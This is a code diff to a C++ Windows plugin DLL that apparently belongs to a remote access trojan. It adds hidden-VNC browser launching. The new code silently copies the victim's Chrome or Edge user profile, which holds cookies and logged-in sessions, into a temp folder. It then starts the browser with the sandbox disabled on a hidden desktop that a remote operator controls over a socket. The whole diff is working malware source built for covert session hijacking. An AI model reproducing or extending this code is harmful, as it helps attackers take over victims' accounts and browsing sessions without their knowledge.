@@ -7,6 +7,8 @@
 #include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
+#include <shlobj.h>
+#include <shlwapi.h>
 #include <algorithm>
 #include <atomic>
 #include <cstdint>
@@ -1134,6 +1136,128 @@ static wstring utf8_to_wstring(const string& str) {
     return res;
 }
 
+static bool delete_directory(wstring path) {
+    if (path.back() == L'\\') path.pop_back();
+    path.push_back(L'\0');
+    path.push_back(L'\0');
+
+    SHFILEOPSTRUCTW s = { 0 };
+    s.wFunc = FO_DELETE;
+    s.pFrom = path.c_str();
+    s.fFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI;
+    return SHFileOperationW(&s) == 0;
+}
+
+static bool copy_directory(wstring src, wstring dst) {
+    delete_directory(dst);
+
+    if (src.back() != L'\\') src.push_back(L'\\');
+    src.push_back(L'*');
+    src.push_back(L'\0');
+    src.push_back(L'\0');
+
+    if (dst.back() == L'\\') dst.pop_back();
+    dst.push_back(L'\0');
+    dst.push_back(L'\0');
+
+    SHFILEOPSTRUCTW s = { 0 };
+    s.wFunc = FO_COPY;
+    s.pFrom = src.c_str();
+    s.pTo = dst.c_str();
+    s.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
+    return SHFileOperationW(&s) == 0;
+}
+
+static void launch_browser_thread(string browserType) {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) return;
+
+    WCHAR localAppData[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
+
+    wstring browserExe = L"";
+    wstring profileSrc = L"";
+    wstring browserName = L"";
+
+    if (browserType == "Chrome") {
+        browserName = L"Chrome";
+        profileSrc = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
+
+        vector<wstring> searchPaths;
+        WCHAR path[MAX_PATH];
+        if (GetEnvironmentVariableW(L"ProgramW6432", path, MAX_PATH))
+            searchPaths.push_back(wstring(path) + L"\\Google\\Chrome\\Application\\chrome.exe");
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path)))
+            searchPaths.push_back(wstring(path) + L"\\Google\\Chrome\\Application\\chrome.exe");
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path)))
+            searchPaths.push_back(wstring(path) + L"\\Google\\Chrome\\Application\\chrome.exe");
+        searchPaths.push_back(wstring(localAppData) + L"\\Google\\Chrome\\Application\\chrome.exe");
+
+        for (const auto& p : searchPaths) {
+            if (PathFileExistsW(p.c_str())) {
+                browserExe = p;
+                break;
+            }
+        }
+    } else if (browserType == "Edge") {
+        browserName = L"Edge";
+        profileSrc = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+
+        vector<wstring> searchPaths;
+        WCHAR path[MAX_PATH];
+        if (GetEnvironmentVariableW(L"ProgramW6432", path, MAX_PATH))
+            searchPaths.push_back(wstring(path) + L"\\Microsoft\\Edge\\Application\\msedge.exe");
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, path)))
+            searchPaths.push_back(wstring(path) + L"\\Microsoft\\Edge\\Application\\msedge.exe");
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path)))
+            searchPaths.push_back(wstring(path) + L"\\Microsoft\\Edge\\Application\\msedge.exe");
+
+        for (const auto& p : searchPaths) {
+            if (PathFileExistsW(p.c_str())) {
+                browserExe = p;
+                break;
+            }
+        }
+    }
+
+    if (browserExe == L"" || !PathFileExistsW(browserExe.c_str())) {
+        send_error("Browser executable not found.");
+        return;
+    }
+
+    WCHAR tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    wstring profileDst = wstring(tempPath) + L"HVNC_" + browserName;
+
+    if (PathFileExistsW(profileSrc.c_str())) {
+        send_status("Copying " + browserType + " profile to temp...");
+        copy_directory(profileSrc, profileDst);
+    } else {
+        send_status(browserType + " profile not found, starting with fresh profile.");
+    }
+
+    wstring cmdLineStr = L"\"" + browserExe + L"\" --user-data-dir=\"" + profileDst + L"\" --no-first-run --no-default-browser-check --disable-gpu --no-sandbox";
+    vector<wchar_t> cmdLine(cmdLineStr.begin(), cmdLineStr.end());
+    cmdLine.push_back(L'\0');
+
+    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+    si.dwFlags      = STARTF_USESHOWWINDOW;
+    si.wShowWindow  = SW_SHOW;
+
+    PROCESS_INFORMATION pi = { 0 };
+    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        g_forceFullFrame = true;
+        send_status(browserType + " started on hidden desktop.");
+    } else {
+        send_error("Failed to start " + browserType + ". Error: " + to_string(GetLastError()));
+    }
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
@@ -1195,28 +1319,33 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_staticFrameCount = 0;
             g_forceFullFrame = true;
         } else if (action == "hvnc_run") {
-            ensure_desktop();
-            if (!g_hHiddenDesktop) return;
-
-            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            vector<wchar_t> cmdLine(path.begin(), path.end());
-            cmdLine.push_back(L'\0');
-
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-            STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-            si.dwFlags      = STARTF_USESHOWWINDOW;
-            si.wShowWindow  = SW_SHOW;
-
-            PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-                g_forceFullFrame = true;
-                send_status("Process started on hidden desktop");
+            string browserType = cmd.value("path", "");
+            if (browserType == "Chrome" || browserType == "Edge") {
+                thread(launch_browser_thread, browserType).detach();
             } else {
-                send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                ensure_desktop();
+                if (!g_hHiddenDesktop) return;
+
+                wstring path = utf8_to_wstring(browserType.empty() ? "cmd.exe" : browserType);
+                vector<wchar_t> cmdLine(path.begin(), path.end());
+                cmdLine.push_back(L'\0');
+
+                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+                STARTUPINFOW si = { sizeof(si) };
+                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+                si.dwFlags      = STARTF_USESHOWWINDOW;
+                si.wShowWindow  = SW_SHOW;
+
+                PROCESS_INFORMATION pi = { 0 };
+                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    g_forceFullFrame = true;
+                    send_status("Process started on hidden desktop");
+                } else {
+                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                }
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
